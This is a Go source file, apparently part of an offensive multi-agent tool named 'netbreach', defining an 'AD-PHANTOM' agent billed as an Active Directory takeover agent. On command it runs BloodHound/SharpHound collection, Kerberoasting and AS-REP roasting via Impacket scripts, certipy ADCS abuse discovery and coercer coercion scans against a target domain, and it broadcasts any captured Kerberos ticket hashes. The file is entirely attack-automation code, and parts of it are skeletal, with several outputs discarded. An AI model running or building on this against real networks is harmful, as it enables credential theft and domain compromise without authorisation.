// AD-PHANTOM — Active Directory Takeover Agent
// bloodhound, sharphound, kerberoast, asreproast, certipy, coercer

package netbreach

import (
	"fmt"
	"os/exec"
	"strings"
)

// ADPhantomAgent handles AD attacks
type ADPhantomAgent struct {
	bus    *EventBus
	state  *SharedState
	stopCh chan struct{}
	msgCh  chan AgentMessage
}

func NewADPhantomAgent(bus *EventBus, state *SharedState) *ADPhantomAgent {
	return &ADPhantomAgent{bus: bus, state: state, stopCh: make(chan struct{}), msgCh: make(chan AgentMessage, 100)}
}

func (a *ADPhantomAgent) Name() string  { return "AD-PHANTOM" }
func (a *ADPhantomAgent) Status() string { return "online" }

func (a *ADPhantomAgent) Start() {
	a.bus.Subscribe("AD-PHANTOM", a.msgCh)
	for {
		select {
		case msg := <-a.msgCh:
			a.Handle(msg)
		case <-a.stopCh:
			return
		}
	}
}

func (a *ADPhantomAgent) Stop() { close(a.stopCh) }

func (a *ADPhantomAgent) Handle(msg AgentMessage) {
	switch msg.Type {
	case "AD_ATTACK":
		a.adAttack(msg.Data)
	}
}

func (a *ADPhantomAgent) broadcast(msg string) {
	a.bus.Broadcast(AgentMessage{From: "AD-PHANTOM", To: "ALL", Type: "LOG", Data: msg})
}

func (a *ADPhantomAgent) adAttack(domain string) {
	a.broadcast(fmt.Sprintf("[AD-PHANTOM] Active Directory takeover: %s", domain))

	// BloodHound data collection
	a.broadcast("[AD-PHANTOM] Running SharpHound / bloodhound-python...")
	if out, err := exec.Command("bloodhound-python", "-d", domain, "-c", "All").CombinedOutput(); err == nil {
		a.broadcast("[AD-PHANTOM] BloodHound data collected")
		_ = out
	} else {
		// sharphound fallback
		if out2, err2 := exec.Command("SharpHound", "-c", "All").CombinedOutput(); err2 == nil {
			a.broadcast("[AD-PHANTOM] SharpHound data collected")
			_ = out2
		}
	}

	// Kerberoasting
	a.broadcast("[AD-PHANTOM] Kerberoasting...")
	if out, err := exec.Command("GetUserSPNs.py", domain, "-request").CombinedOutput(); err == nil {
		output := string(out)
		if strings.Contains(output, "krb5tgs") {
			a.broadcast("[CRITICAL] Kerberoastable accounts found!")
			for _, line := range strings.Split(output, "\n") {
				if strings.Contains(line, "krb5tgs") {
					a.broadcast(fmt.Sprintf("[AD-PHANTOM] TGS: %s", line))
				}
			}
		}
		_ = output
	}

	// AS-REP Roasting
	a.broadcast("[AD-PHANTOM] AS-REP Roasting...")
	if out, err := exec.Command("GetNPUsers.py", domain, "-request").CombinedOutput(); err == nil {
		output := string(out)
		if strings.Contains(output, "$krb5asrep$") {
			a.broadcast("[CRITICAL] AS-REP roastable accounts found!")
		}
		_ = output
	}

	// Certipy - ADCS abuse
	a.broadcast("[AD-PHANTOM] Checking ADCS with certipy...")
	if out, err := exec.Command("certipy", "find", "-target", domain).CombinedOutput(); err == nil {
		output := string(out)
		if strings.Contains(output, "ESC1") || strings.Contains(output, "ESC8") {
			a.broadcast("[CRITICAL] ADCS vulnerabilities found (ESC1/ESC8)!")
		}
		_ = output
	}

	// Coercer - coercion attacks
	a.broadcast("[AD-PHANTOM] Testing coercion with coercer...")
	if out, err := exec.Command("coercer", "scan", "-t", domain).CombinedOutput(); err == nil {
		output := string(out)
		if strings.Contains(output, "vulnerable") {
			a.broadcast("[CRITICAL] Coercion vulnerabilities found!")
		}
		_ = output
	}
}
